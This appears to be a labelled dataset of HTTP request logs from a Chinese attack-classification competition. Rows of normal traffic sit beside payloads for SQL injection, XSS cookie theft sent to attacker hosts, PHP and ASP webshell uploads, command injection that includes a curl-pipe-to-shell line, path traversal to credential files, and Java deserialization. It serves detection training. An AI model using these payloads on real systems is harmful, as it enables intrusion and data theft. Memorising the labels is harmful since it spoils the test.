row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
5185,2025-10-28 21:08:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.187.37.152,10.187.35.4,/products,,正常访问,正常访问
3476,2025-10-25 13:56:54,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.13.102,10.251.227.4,/upload,"------WebKitFormBoundary262138
Content-Disposition: form-data; name=""upload""; filename=""webshell72.asp""
Content-Type: application/octet-stream

<% eval request(""cmd"") %>
------WebKitFormBoundary71583--",文件上传攻击,文件上传攻击
7902,2025-10-26 12:48:10,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.22.249,10.10.110.144,/process,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzS+mF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRoc+mVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==21+7",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
5562,2025-11-06 05:07:24,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.71.188,10.252.110.85,/search,"id=436 AND IF((SELECT user()),SLEEP(4),0)",SQL注入攻击,SQL注入攻击
695,2025-11-02 07:21:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.53.59.62,10.18.20.132,/change-password,recipient=attacker&sum=9999,CSRF攻击,CSRF攻击
8596,2025-11-06 19:04:24,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/blog,,正常访问,正常访问
3147,2025-10-26 11:53:57,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.25.56,10.251.10.246,/profile/avatar,"------WebKitFormBoundary173886
Content-Disposition: form-data; name=""document""; filename=""malware22.exe""
Content-Type: application/octet-stream

MZ......................
------WebKitFormBoundary779438--",文件上传攻击,文件上传攻击
2848,2025-10-31 12:10:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.251.216.112,10.252.133.241,/about/951,,正常访问,正常访问
7305,2025-11-03 20:13:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.130.252,10.252.187.131,/static,resource=../../.env672,目录遍历攻击,目录遍历攻击
10492,2025-10-27 17:36:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.244.33.165,10.10.159.189,/message&test=352&debug=0&debug=0,q%3D%3Cimg%20src%3Dx%20onerror%3Dalert(831)%3E&debug=0,XSS跨站脚本攻击,XSS跨站脚本攻击
5469,2025-11-11 06:23:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.5.221,10.251.227.43,/login,ProduCt=589'; WAITfoR dElaY '00:00:03'--,SQL注入攻击,SQL注入攻击
8878,2025-11-07 05:09:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.74.181,10.252.158.86,/include,page=http://malicious429.com/shell.txt,文件包含攻击,文件包含攻击
10257,2025-11-01 17:26:18,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/api/comment,q=<img src=x onerror=alert(743)>,XSS跨站脚本攻击,XSS跨站脚本攻击
7388,2025-10-22 14:34:58,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.253.92.7,10.10.228.198,/register/32,,正常访问,正常访问
10357,2025-11-06 21:53:23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.25.56,10.251.10.246,/api/orders,,正常访问,正常访问
7223,2025-10-22 03:40:10,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.68.105,10.10.110.133,/view?content=../../../.git/config296,,目录遍历攻击,目录遍历攻击
2733,2025-10-25 08:46:48,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.245.76.184,10.252.133.241,/login,,正常访问,正常访问
9541,2025-11-06 01:00:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.14.28,192.168.2.2,/upload,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==641",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
8744,2025-11-01 12:37:18,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.20.95,10.251.10.19,/lookup?target=127.0.0.1236|id,,远程命令执行攻击,远程命令执行攻击
96,2025-10-16 16:45:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.189.54,10.153.176.212,/API/datA&test=1,"ro0ABXNyABfQYXZhLNV0aWWUSGfzafNldJYGou83gm6gAGaBRgaKbG9hZEZHy3RvcKKACXrocMVZAg9SZHhwp0AAaAaaAAx3CaAaAbAAAAAHDAAkamf2YS51DGlSlnNyabFQyXZhLmXhbMcuunvUdGLtZqAaaaaAaaAAAaAABxZYAbBqYXzHLmxHBmcUU3LZdGVtAAAAAaAAAAAaaaBJkWN1CnJlbnRUAW1lTwlsBGLzSMF2YQBAb3jnlmfWywNozS5jB21Tb25ZlMnvbGxLy3Rp
b25zms5Db25zDGFUdE1hcAAAaAAaAaabWACiaaVtyXB0Aa9Mamf2YS91dglSL01hcdT4cHCIaaaAQaAAaaJZCgARam+f2YS5sYw5nLklUdGVnZXiS4qcK94gHoaIAAUkAbXzhBhVleHIaEGPhdmEubGFuzy5OdW1iZXKgrJudc5tgiwiAahhwAAaAaXNYABRqYXzHLnV0awwusGFzae1hCAUH2shDfmDPawaDSQaKbG9HzEzHY3RvckKACXRocMVzAg9SzHhwp0AAaAaAAAb3cAAAaBaAAAAhdAAJBXlpYmPLy3R0aAjbQnNyABdqYXzHlMxhBmcuU3ryaW5N063KkLjqYr4CAAFAAaV2yWx1ZXhyaBbQYXZHLmXhbMcuT2jqZWn0AAAAAAAAAaaaaAb4ChQAbhRLC3R0aAR0CNVlea%3d%3d&random=32&random=32&random=3+2",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
5181,2025-10-22 16:06:21,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.185.6,10.10.208.65,/upload,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQ+AAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D566",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6729,2025-11-01 01:21:49,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.244.96.109,10.210.184.42,/login,page=38&limit=10&sort=name,正常访问,正常访问
7923,2025-10-28 22:22:43,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.19.232,10.253.177.26,/lang?theme=phar://malicious113.phar/shell.php,,文件包含攻击,文件包含攻击
109,2025-11-12 03:02:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.10.180,10.200.227.115,/admin,id=+1 O+R 1+=1,SQL注入攻击,SQL注入攻击
8197,2025-11-04 19:57:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.7.78,10.244.155.171,/page&timestamp=1763345923&timestamp=1763345923,page=zip://malIcIous350.zip#sHeLl.php&debug=1&debug=1&test=867,文件包含攻击,文件包含攻击
10304,2025-11-05 20:16:55,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.14.206,10.251.227.107,/search,,正常访问,正常访问
2194,2025-11-05 17:33:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.74.97,10.252.158.86,/dashboard,,正常访问,正常访问
3484,2025-10-31 16:35:03,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.211,/fILe/uPload,"------WeBKitFormboundarY555460
CONtEnt-DispoSitiOn:%20Form-datA;%20nAMe%3D%22fILe%22;%20fILename%3D%22shelL690.PhP%22
conteNT-TYpe:%20APPlication/octet-StREaM

%3C?PhP%20sysTem($_get[%27cMd%27]);%20?%3E
------WEBKitFORmBOunDary382275--",文件上传攻击,文件上传攻击
9170,2025-10-28 13:23:05,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.210.10.227,10.244.155.164,/search?ip=127.0.0.1743; curl http://attacker590.com/malware.sh | sh,,远程命令执行攻击,远程命令执行攻击
2282,2025-11-05 08:52:55,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.24.164,10.251.10.18,/login?id=799'; DROP TABLE users61; --,,SQL注入攻击,SQL注入攻击
7840,2025-11-17 02:51:02,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.53.69,10.252.186.192,/api/CommENt,comment=<img sRc=X ONeRror=This.src='htTp://ATtacKEr664.cOm/sTeal.PHp?cookie='+documENT.cookie>,XSS跨站脚本攻击,XSS跨站脚本攻击
7193,2025-11-05 17:30:48,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.101.200,10.210.184.38,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==976",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
499,2025-10-25 06:35:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.10.130.17,10.18.76.78,/register,page=1&limit=10&sort=name,正常访问,正常访问
4944,2025-10-18 08:57:46,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.237,10.244.165.61,/api/ping?q%3Dhello160|c%27a%27t%20/etc/passwd&random=756&debug=1,,远程命令执行攻击,远程命令执行攻击
8788,2025-10-31 22:56:36,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.250.238.99,10.244.155.165,/about?q=search,,正常访问,正常访问
5498,2025-10-31 06:17:01,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.187.37.190,10.252.110.85,/register,"{""username"":""user5159"",""password"":""secret7916""}",正常访问,正常访问
7577,2025-11-16 01:06:05,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.212,/process&timestamp=1763343820&random=9031&debug=1,"Ro0AbXNYADRTeS5wYwNrYWdLlK15Q2XhC3maAAAAAaAAAQwAAHHWDwEaHqaCAaAAAnnyABFqyxZHLMxhbMCuuNVUdGLTZQAAAAAAAAaAaAAABxZyaBBQYXzhlmxhBmcuu3lzdGVTAAaaAAAAAaAAAABjKWN1CnJlBnRUaW1LTWLsbglZSmf2YQBab+3jNlmFwYWnoZS5jB21tb25zlMNvbgxLY3RP
b25zmS5CyxnoZU1hcaAAAAaAaAABWACIAAVtYXB0AA9mamF2ys91DGLsL01hcDt4cHnyABfqYXzhLnV0awwusGFzaE1HcAuh2shDfmDPawADSqAKBG9HzeZhY3RvckKACXRocmvZaG9sZHhwP0AAA+aAAAaB3CaaAabAAAaAhDaAjbXlPYMplY3r0AAjBqnnYAbDQYxZhLmXhBmcUu3ryaW5N063KKLjQYr4CaAFaaav2yWx1ZxhyaBBqYXzhLmXhBmcuT2JqZWN0aAaAaaAAaAAAaAB4cHqaBHrlC3R0AAr0cNVLea%3D%3d814&cache=true&debug=0",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
3123,2025-10-27 14:41:15,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.187.74.170,10.252.158.86,/process,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==455",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
5914,2025-10-19 10:16:58,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.20.65,10.251.99.249,/pRofile&debug=0,PAge=42&limit=10&sorT=NAmE&debug=1,正常访问,正常访问
1181,2025-11-16 01:43:47,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,192.168.10.39,10.251.10.29,/products/441,,正常访问,正常访问
3830,2025-10-28 01:28:54,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/services,title=New Post 8007&content=Post content here,正常访问,正常访问
1621,2025-11-14 09:13:36,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.244.10.227,10.244.155.133,/ApI/data,"rO0AbXNyABFqYXzhLNV0awwuSgFZAFNlDJygOU83gM6gAGABRgakbg9hzEZhY3rVckkaCXrOcMvzAG9sZhhWp0AAAAaaAAx3CaAAABAAAaahdaAkamF2ys51dGLsLNnyABfQYxzHLmXhbmCuunVudGltZQaAAAAaAAAAAaAABXZyaBBQyXZhlmXhbmcUU3lzdGvTaAAAAAaAaAAAAabjkwN1cNJlBnRUaW1lTWLSbgLzSMf2YqbaB3jnLmFwYWNoZS5jb21tb25zLmnvbGXLy3Rp
B25ZMS5db25zDGFude1hcaaAaaAaAAABWaCiAaVTYxB0AA9MamF2Ys91dGlsL01hcdt4cHcIAaaaQAAAAAjzcGaramf2yS5Syw5NlKluDgVNzXiS4qck94gHoaiAAUkAbxZhBHvLeHIAEGPhDmEUBgFuzY5ODW1izXKGrJudc5TgIwiaaHhwAaAaAXnYABrqYxZhlNV0aWwuSGfZaE1hcAUH2SHdfmdPawADSQAKBg9hZEZhy3RVckkACXRocMvzag9SZHhWP0AAAAaaaaB3CAAaAbAAaAaHdAajBXlPYmPlY3R0AAJbQnnYABdQyXzHLMxhBmCuu3RyaW5n063KKLjqYr4CaaFAAAV2yWX1zXHyABBqYXZhLmXhbMcuT2JQZWN0aAAAaAAAAAAAAAB4chQAbHRlC3R0aar0cnvLeA%3D%3D393",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6410,2025-11-16 15:58:30,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.204.153,10.210.184.38,/products,comment=This is a great product 4722,正常访问,正常访问
9138,2025-11-15 00:38:46,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.14.28,192.168.2.39,/search?domain=test706.com&&whoami,,远程命令执行攻击,远程命令执行攻击
10278,2025-10-30 21:15:08,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.13.185,10.251.212.222,/transfer,redirect_url=http://malicious688.com&token=bypass,CSRF攻击,CSRF攻击
7328,2025-11-04 09:42:37,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.20.146,10.251.227.103,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==25",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
2564,2025-11-13 22:30:56,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.7.103,10.240.99.224,/profile,comment=<img src=x onerror=this.src='http://attacker202.com/steal.php?cookie='+document.cookie>,XSS跨站脚本攻击,XSS跨站脚本攻击
8052,2025-10-25 08:13:59,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.210.132.201,10.244.155.146,/api/orders,,正常访问,正常访问
7686,2025-11-12 03:56:05,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.10.52,10.244.155.172,/api/users&debug=0,search%3D%27)%20OR%20(%27+1%27%3D%271&test=346&cach+e=true&timestamp=17633426+03,SQL注入攻击,SQL注入攻击
6449,2025-11-07 02:30:59,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.108.208.231,10.253.251.83,/api/download?dir=../../../../boot.ini793,,目录遍历攻击,目录遍历攻击
6977,2025-10-29 03:00:03,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.22.153,10.251.96.251,/change-password&test=993,target_user=administrator&permission=admin&timestamp=1763343644&debug=0,CSRF攻击,CSRF攻击
8776,2025-10-27 09:29:16,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,10.210.34.43,10.244.155.164,/about/908&timestamp=1763348547&random=8655,,正常访问,正常访问
5415,2025-10-22 22:13:15,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.7.59,10.251.99.248,/profile,"{""username"":""user385"",""password"":""secret9182""}",正常访问,正常访问
10807,2025-11-11 04:49:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.206.73,10.210.184.39,/search,q=<img src=x onerror=alert&#40;669&#41;>,XSS跨站脚本攻击,XSS跨站脚本攻击
7312,2025-11-10 15:28:13,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.7.60,10.10.105.71,/lookup,q=hello104|cat /etc/passwd,远程命令执行攻击,远程命令执行攻击
3902,2025-11-04 18:10:24,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.7.50,10.244.193.121,/download,document%3D../../../../windows/system32/drivers/etc/hosts357,目录遍历攻击,目录遍历攻击
9657,2025-11-13 08:51:47,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.196,/lookUp?ADdress=127.0.0.1344; ls -la,,远程命令执行攻击,远程命令执行攻击
4686,2025-10-31 04:54:35,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.208.116.216,10.208.54.1,/upload,"------WebKitFormBoundary932472
Content-Disposition: form-data; name=""avatar""; filename=""backdoor85.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary369127--",文件上传攻击,文件上传攻击
7743,2025-11-13 22:42:11,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,10.108.207.235,10.252.186.189,/services/210,,正常访问,正常访问
5514,2025-10-30 15:24:11,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.252.189.21,10.253.246.40,/search?id%3D823%20OR%201%3D1,,SQL注入攻击,SQL注入攻击
10751,2025-11-07 00:38:09,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.7.69,10.244.155.144,/api/data,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==270",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
1610,2025-11-10 08:46:58,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.251.204.99,10.210.184.39,/aPI/uSers,,正常访问,正常访问
